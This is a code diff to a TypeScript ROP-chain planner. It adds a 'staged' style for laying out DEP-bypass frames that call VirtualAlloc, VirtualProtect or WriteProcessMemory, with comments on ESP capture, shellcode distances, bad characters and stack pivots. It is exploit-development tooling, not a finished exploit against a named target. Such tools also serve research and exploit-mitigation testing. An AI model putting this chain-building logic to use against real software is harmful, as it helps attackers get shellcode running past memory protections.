@@ -5,12 +5,13 @@ import { CapabilityKind, RopGadget } from "../rop/types";
 import { FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, Slot } from "./dep_frames";
 import { DepApi } from "./rop_template";
 
-export type DepPlanStyle = "skeleton" | "pushad";
+export type DepPlanStyle = "skeleton" | "pushad" | "staged";
 
 type Source = Slot["source"];
 
 export const DEP_PLAN_APIS: DepApi[] = ["VirtualAlloc", "VirtualProtect", "WriteProcessMemory"];
-export const DEP_PLAN_STYLES: DepPlanStyle[] = ["skeleton", "pushad"];
+/** In the order the tool prefers when more than one of them is complete; chooseStyle says why. */
+export const DEP_PLAN_STYLES: DepPlanStyle[] = ["skeleton", "pushad", "staged"];
 export const DEP_PLAN_SECTIONS = 7;
 
 export type Constant = { field: string; value: number };
@@ -61,12 +62,16 @@ export type Job = {
    * round. Liveness is read off this rather than off a list of keys, so a style's own fill jobs say
    * for themselves that they repeat. */
   repeats?: boolean;
+  /** The `add` job only: its distance runs back towards lower addresses, so only a gadget that adds can
+   * carry it. The chain pops the distance, a sub consumes the opposite sign of an add, and a few hundred
+   * bytes is 0x000001xx one way round, which no target with 00 among its bad chars can send. */
+  backwards?: boolean;
   flow: Flow;
 };
 
 const SKELETON_JOBS: Job[] = [
   { key: "capture", title: "capture ESP", capabilities: ["STACK_POINTER_CAPTURE"], flow: { sets: { role: "pointer", port: "dest" } } },
-  { key: "add", title: "add the distance to field 1", capabilities: ["REGISTER_ADD", "REGISTER_SUB"],
+  { key: "add", title: "add the distance to field 1", capabilities: ["REGISTER_ADD", "REGISTER_SUB"], backwards: true,
     flow: { reads: { dest: "pointer" }, sets: { role: "pointer", port: "dest" } } },
   { key: "copy", title: "copy a register", capabilities: ["MOVE_REGISTER", "EXCHANGE_REGISTER"],
     flow: { reads: { source: "pointer" }, sets: { role: "field", port: "dest" } } },
@@ -76,6 +81,29 @@ const SKELETON_JOBS: Job[] = [
     flow: { reads: { dest: "field" }, sets: { role: "field", port: "dest" } } },
   { key: "negate", title: "negate", capabilities: ["REGISTER_NEGATE"], repeats: true, flow: { sets: { role: "value", port: "dest" } } },
   { key: "pivot", title: "pivot ESP onto the frame", capabilities: ["STACK_PIVOT"], flow: { reads: { source: "field" } } },
+];
+
+// A staged chain lays the frame at a fixed writable address in the module instead of in the stack
+// buffer. Every field's address is then a constant, which is what the whole pointer apparatus of the
+// skeleton exists to avoid needing: there is nothing to copy out of the captured ESP, nothing to walk
+// from one field to the next with an `inc`, and the pivot targets a constant rather than a register the
+// chain has carried. What is left is a load per field address, the write, and the one value no constant
+// can be, the shellcode's address in the payload, which is still the captured ESP plus a distance.
+//
+// The field load comes after the value, not before it, and that is the second half of the gain: the
+// skeleton has to keep the field address live across every value load because only a run can tell it
+// what the address is, while a constant can be popped again at any point. So the value loads here keep
+// nothing at all, and a gadget the skeleton refused for clobbering the field address is usable.
+const STAGED_JOBS: Job[] = [
+  { key: "capture", title: "capture ESP", capabilities: ["STACK_POINTER_CAPTURE"], flow: { sets: { role: "pointer", port: "dest" } } },
+  { key: "add", title: "add the distance to the shellcode", capabilities: ["REGISTER_ADD", "REGISTER_SUB"],
+    flow: { reads: { dest: "pointer" }, sets: { role: "pointer", port: "dest" } } },
+  { key: "read", title: "read a pointer", capabilities: ["MEMORY_READ"], flow: { sets: { role: "value", port: "dest" } } },
+  { key: "negate", title: "negate", capabilities: ["REGISTER_NEGATE"], repeats: true, flow: { sets: { role: "value", port: "dest" } } },
+  { key: "field", title: "load a field address", capabilities: ["LOAD_REGISTER"], repeats: true,
+    flow: { sets: { role: "field", port: "dest" } } },
+  { key: "write", title: "write a field", capabilities: ["MEMORY_WRITE"], repeats: true, flow: { reads: { address: "field", source: "value" } } },
+  { key: "pivot", title: "pivot ESP onto the frame", capabilities: ["STACK_PIVOT"], flow: {} },
 ];
 
 /** The registers the PUSHAD draft loads, in the order it loads them, read off the API's own frame. ESI
@@ -109,6 +137,19 @@ export function jobsFor(style: DepPlanStyle, api: DepApi = "VirtualAlloc"): Job[
   }
   const frame = FRAMES[api];
   const needs = (kind: Source["kind"]): boolean => frame.some((slot) => slot.source.kind === kind);
+  if (style === "staged") {
+    return STAGED_JOBS.filter((job) => {
+      // ESP is wanted for one reason only: the shellcode is in the payload, so its address is the
+      // captured ESP plus a distance. A frame with no such slot needs neither job.
+      if (job.key === "capture" || job.key === "add") return needs("shellcode");
+      // The API's address is a dword in the import table, so it is read, not popped.
+      if (job.key === "read") return needs("api");
+      // The negate exists to send the size, and the size is the one value the emitted script chooses at
+      // run time. Only VirtualAlloc's frame computes one.
+      if (job.key === "negate") return needs("size");
+      return true;
+    });
+  }
   return SKELETON_JOBS.filter((job) => {
     // The negate exists to send the size, and the size is the one value the emitted script chooses at
     // run time. Only VirtualAlloc's frame computes one.
@@ -306,7 +347,10 @@ export function fieldRegister(plans: JobPlan[]): string | undefined {
 function rejection(gadget: RopGadget, job: Job, at: Ports, live: Array<{ role: Role; register: string }>, bound: Partial<Record<Role, string>>): string | undefined {
   const capability = jobCapability(gadget, job);
   if (job.key === "add") {
-    if (capability?.kind === "REGISTER_SUB") return "subtracts: the distance to field 1 is negative, so pop it and add";
+    // A staged chain's distance runs forward, to the shellcode, and says nothing here: whether its own
+    // sign can be sent depends on a negate of the distance register, which is a question about the
+    // corpus, and dep_build's sled route is where it is asked and answered.
+    if (job.backwards && capability?.kind === "REGISTER_SUB") return "subtracts: the distance to field 1 is negative, so pop it and add";
     if (!REGISTER.test(at.source ?? "")) return `adds a fixed ${at.source}, not the distance you pop`;
     if (at.source === at.dest) return `adds ${at.dest} to itself, which doubles it and adds no distance`;
   }
@@ -535,24 +579,30 @@ export function planWrites(
 // The jobs a sequence can do when no single gadget does. Searched over what each gadget does to the
 // registers, so `push eax ; pop ecx ; ret` is a copy and `pop eax` then `xchg eax, esi` is a load of ESI.
 function withPaths(plans: JobPlan[], index: CapabilityIndex | undefined, exclude: number[]): JobPlan[] {
-  const copyPlan = plans.filter((plan) => plan.job.key === "copy")[0];
+  const setter = fieldSetter(plans);
   const writeAddress = plans.filter((plan) => plan.job.key === "write")[0]?.pick?.at.address;
-  // A copy whose single gadget lands the field address somewhere other than the register the write reads
-  // it from leaves every field paying a move there and a move back, and when that register is also the
-  // one the values are loaded into the chain has nowhere to put them at all. So a misplaced copy is a
-  // copy to search a path for, exactly as an absent one is.
-  const misplaced = copyPlan?.pick !== undefined && writeAddress !== undefined && copyPlan.pick.at.dest !== writeAddress;
+  // A field setter whose single gadget lands the field address somewhere other than the register the
+  // write reads it from leaves every field paying a move there and a move back, and when that register
+  // is also the one the values are loaded into the chain has nowhere to put them at all. So a misplaced
+  // setter is one to search a path for, exactly as an absent one is.
+  const misplaced = setter?.pick !== undefined && writeAddress !== undefined && setter.pick.at.dest !== writeAddress;
   if (!index || (!misplaced && plans.every((plan) => plan.pick))) return plans;
   const search = new ReachIndex(index.gadgets.filter((gadget) => exclude.indexOf(gadgetAddress(gadget)) < 0 && !movesEsp(gadget)));
   const picked = (key: string): Verdict | undefined => plans.filter((plan) => plan.job.key === key)[0]?.pick;
   const isReg = (register: string | undefined): register is Reg => register !== undefined && (REACH_REGS as string[]).indexOf(register) >= 0;
   return plans.map((plan): JobPlan => {
-    if (plan.job.key === "copy" && (!plan.pick || misplaced)) {
-      // The copy carries the captured ESP into the register the write takes its address from.
-      const from = picked("capture")?.at.dest;
+    if (setter && plan.job === setter.job && (!plan.pick || misplaced)) {
+      // Where the field address comes from is what separates the two styles that write a frame field by
+      // field. The skeleton's setter reads the captured ESP, so its path is a copy between registers; a
+      // staged frame's setter reads nothing, because the address is a constant, so its path is a fill of
+      // that register from the chain's own dwords. Either way it has to end in the write's register.
+      const carries = plan.job.flow.reads !== undefined;
+      const from = carries ? picked("capture")?.at.dest : "the chain";
       const to = writeAddress;
-      const gadgets = isReg(from) && isReg(to) ? search.copy(from, to, [])?.map((effect) => effect.gadget) : undefined;
-      return gadgets ? { ...plan, pick: undefined, path: { from: from as string, to: to as string, gadgets } } : plan;
+      const gadgets = !isReg(to) ? undefined
+        : carries ? (isReg(from) ? search.copy(from, to, [])?.map((effect) => effect.gadget) : undefined)
+          : load(to, []);
+      return gadgets && from ? { ...plan, pick: undefined, path: { from, to: to as string, gadgets } } : plan;
     }
     if (plan.pick) return plan;
     if (plan.job.key.indexOf("pop_") === 0 && isReg(plan.job.register)) {
